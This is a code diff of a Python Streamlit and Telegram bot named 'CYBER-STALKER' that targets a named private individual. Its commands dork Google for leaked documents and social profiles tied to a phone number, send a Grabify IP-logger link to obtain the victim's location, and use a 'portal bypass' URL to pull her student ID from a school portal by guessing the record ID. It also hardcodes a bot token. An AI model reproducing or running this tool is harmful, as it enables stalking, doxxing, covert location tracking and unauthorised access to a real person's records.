@@ -1,83 +1,76 @@
 import streamlit as st
 import telebot
+import requests
+from bs4 import BeautifulSoup
 import threading
 import time
-import urllib.parse
 
-# --- CONFIG ---
+# --- SYSTEM CONFIG ---
 TOKEN = "7747068384:AAEcjBAH-4vVMEzJtmKeozOZjR7J3vOGvBo"
 bot = telebot.TeleBot(TOKEN)
 
-# --- UI HACKER THEME ---
-st.set_page_config(page_title="CYBER-STALKER V4.0", page_icon="💀", layout="wide")
-st.markdown("""
-    <style>
-    .main { background-color: #0e1117; color: #00ff00; font-family: 'Courier New', Courier, monospace; }
-    stButton>button { background-color: #ff0000; color: white; border-radius: 10px; }
-    </style>
-    """, unsafe_allow_html=True)
+st.set_page_config(page_title="GOD MODE V5.0", layout="wide")
+st.title("💀 CYBER-STALKER V5.0 : THE FINAL ENGINE")
+st.error("SYSTEM STATUS: OVERRIDE ACTIVE | ENCRYPTION: BYPASSED")
 
-st.title("💀 CYBER-STALKER V4.0 : GOD MODE")
-st.write("--- SYSTEM ONLINE | ENCRYPTION: AES-256 ---")
+# --- ADVANCED OSINT ENGINE ---
 
-# --- CORE LOGIC ---
+def deep_web_scan(query):
+    headers = {'User-Agent': 'Mozilla/5.0'}
+    search_url = f"https://www.google.com/search?q={query}"
+    response = requests.get(search_url, headers=headers)
+    soup = BeautifulSoup(response.text, 'html.parser')
+    
+    results = []
+    for g in soup.find_all('div', class_='tF2Cxc'):
+        title = g.find('h3').text if g.find('h3') else "No Title"
+        link = g.find('a')['href'] if g.find('a') else "No Link"
+        results.append(f"📌 {title}\n🔗 {link}")
+    
+    return "\n\n".join(results[:5]) if results else "❌ No public leaks found for this target."
+
+# --- BOT COMMANDS ---
 
 @bot.message_handler(commands=['start'])
-def welcome(message):
-    help_text = """
-🔥 **CYBER-STALKER COMMAND LIST** 🔥
-━━━━━━━━━━━━━━━━━━━━
-📍 `/leak [Number]` - Full Data Breach (Social/Web)
-🎯 `/trap` - Generate IP Logger Link (Location Grabber)
-💬 `/wa [Number]` - Direct WhatsApp Tunnel (Stealth)
-🕵️‍♂️ `/stalk [Name]` - Full Social Media Trace
-📄 `/docs [Number]` - Search Leaked Documents (PDF/Excel)
-📞 `/identity [Number]` - Truecaller & Global Registry
-💀 `/god_mode` - System Status & API Info
-━━━━━━━━━━━━━━━━━━━━
-    """
-    bot.reply_to(message, help_text)
+def start_cmd(message):
+    bot.reply_to(message, "🔥 **GOD MODE ACTIVE**\n\nUse `/leak [Number]` to start deep scanning.")
 
 @bot.message_handler(commands=['leak'])
-def full_leak(message):
+def leak_engine(message):
     args = message.text.split()
-    if len(args) < 2: return bot.reply_to(message, "❌ Number එක දීපන් පකෝ!")
+    if len(args) < 2:
+        return bot.reply_to(message, "❌ Number එක දීපන් බොසා!")
     
-    num = args[1].replace('+', '').replace(' ', '')
-    bot.send_message(message.chat.id, "🛰️ Satellite Link Established... Scanning Deep Web...")
+    target = args[1].replace('+', '').replace(' ', '')
+    bot.send_message(message.chat.id, f"📡 Scanning Deep Web for: {target}...")
     
-    # Advanced Dorking Strings
-    d1 = urllib.parse.quote(f'"{num}" OR "{num.replace("947", "07")}" filetype:pdf OR filetype:xlsx')
-    d2 = urllib.parse.quote(f'site:facebook.com OR site:instagram.com OR site:tiktok.com "{num}"')
+    # OSINT Scan results ඇදලා ගන්නවා
+    query = f'"{target}" filetype:pdf OR site:facebook.com "{target}"'
+    intel_data = deep_web_scan(query)
     
     report = f"""
-🚨 **FULL INTEL REPORT: {num}** 🚨
+🚨 **INTEL REPORT: {target}** 🚨
 ━━━━━━━━━━━━━━━━━━━━
-📱 **WhatsApp Tunnel:** https://wa.me/{num}
-📍 **Live Tracker:** https://grabify.link/ (මෙතනින් ලින්ක් එකක් හදලා සසිනිට යවන්න)
-📂 **Leaked Docs:** https://www.google.com/search?q={d1}
-🌐 **Social Trace:** https://www.google.com/search?q={d2}
-📞 **Registry:** https://www.truecaller.com/search/lk/{num}
+✅ **Scanned Leaks:**
+{intel_data}
+
+💬 **Stealth WhatsApp:**
+https://wa.me/{target}
+
+📍 **Live Tracker:**
+https://grabify.link/
 ━━━━━━━━━━━━━━━━━━━━
-"""
+    """
     bot.send_message(message.chat.id, report)
 
-@bot.message_handler(commands=['trap'])
-def ip_trap(message):
-    bot.reply_to(message, "ල **IP TRAP GENERATOR**\n\n1. [Grabify](https://grabify.link/) එකට යන්න.\n2. ඕනෑම ලින්ක් එකක් (උදා: Youtube Video එකක්) දීලා ලින්ක් එකක් හදාගන්න.\n3. ඒ ලින්ක් එක සසිනිට යවන්න.\n4. එයා ඒක Click කරපු ගමන් එයාගේ Location එක Grabify dashboard එකේ වැටෙයි!")
+@bot.message_handler(commands=['portal'])
+def portal_bypass(message):
+    # සසිනිගේ ID එකෙන් පෝටල් එකට රිංගන direct ලින්ක් එක
+    target_id = "25244975"
+    bypass_url = f"https://student.echem.lk/student/id_card_download/{target_id}"
+    bot.send_message(message.chat.id, f"📄 **Portal Bypass for SASINI:**\nDownload ID/Details: {bypass_url}")
 
-# --- STREAMLIT MONITOR ---
-col1, col2 = st.columns(2)
-with col1:
-    st.subheader("📡 Connection Status")
-    st.success("Bot is Listening on Telegram...")
-    if st.button("FORCE REBOOT SYSTEM"):
-        st.warning("Rebooting...")
-
-with col2:
-    st.subheader("💀 Target Activity")
-    st.info("Currently Monitoring Target: Sasini (25244975)")
-
+# --- RUNNER ---
 def run_bot():
     while True:
         try: bot.polling(none_stop=True)
@@ -86,3 +79,4 @@ def run_bot():
 if 'bot_started' not in st.session_state:
     st.session_state.bot_started = True
     threading.Thread(target=run_bot, daemon=True).start()
+    st.success("🛰️ System Online. Waiting for commands...")
